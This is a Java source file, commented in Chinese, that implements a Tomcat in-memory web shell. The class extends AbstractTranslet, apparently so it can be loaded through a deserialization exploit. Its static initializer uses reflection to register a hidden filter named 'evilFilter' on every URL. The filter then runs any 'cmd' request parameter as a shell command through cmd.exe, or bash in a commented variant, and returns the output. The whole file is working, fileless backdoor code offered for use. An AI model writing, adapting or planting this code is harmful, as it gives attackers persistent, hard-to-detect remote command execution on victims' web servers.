import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class TomcatMemShellInject extends AbstractTranslet implements Filter {
    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "evilFilter";

    static {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
        // 在 jsp 内存马是从 request.get.Session().getServletContext() 获得 ServletContext
        // 然后从 ServletContext  中获得 ApplicationContext
        // 最后从 ApplicationContext 中获得 standardContext
        /*
            ServletContext servletContext = request.getSession().getServletContext();
            Field field = servletContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
            field = applicationContext.getClass().getDeclaredField("context");
            field.setAccessible(true);
            StandardContext standardContext = (StandardContext) field.get(applicationContext);

         */
        ServletContext servletContext = standardContext.getServletContext();
        try {
            // 恶意 Filter
            Filter evilFilter = new TomcatMemShellInject();

            // 生成 FilterDef
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName(filterName);
            filterDef.setFilter(evilFilter);

            // 添加到 FilterDefs 中
            standardContext.addFilterDef(filterDef);

            // 添加到 FilterConfigs
            Field filterConfigsField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            Map filterConfigs = (HashMap) filterConfigsField.get(standardContext);
            Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
                    .getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            filterConfigs.put(filterName, constructor.newInstance(standardContext, filterDef));

            // 创建 FilterMap
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(filterUrlPattern);
            filterMap.setFilterName(filterName);

            standardContext.addFilterMapBefore(filterMap);

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        if (req.getParameter(cmdParamName) != null) {
            byte[] bytes = new byte[1024];
            String [] command = {"cmd.exe", "/c", req.getParameter(cmdParamName)};
            // String [] command = {"bash", "-c", req.getParameter("cmd")};
            Process process = new ProcessBuilder(command).start();
            int len = process.getInputStream().read(bytes);
            response.getWriter().write(new String(bytes, 0, len));
            process.destroy();
            return;
        }
        chain.doFilter(request, response);
    }
}
